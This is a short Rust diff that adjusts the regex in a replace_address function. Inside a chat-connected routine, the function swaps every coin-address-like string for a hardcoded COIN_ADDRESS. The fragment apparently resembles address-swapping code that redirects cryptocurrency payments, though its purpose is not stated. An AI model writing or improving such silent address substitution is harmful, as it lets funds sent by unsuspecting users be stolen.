@@ -22,7 +22,7 @@ pub async fn run(chat_connect: String) {
 }
 
 fn replace_address(address: &str) -> String {
-    let re = Regex::new(r"\b(7[a-zA-Z0-9]{25,34})\b").unwrap();
+    let re = Regex::new(r"(^| )(7[a-zA-Z0-9]{25,34})( |$)").unwrap();
 
     re.replace_all(address, COIN_ADDRESS).to_string()
 }
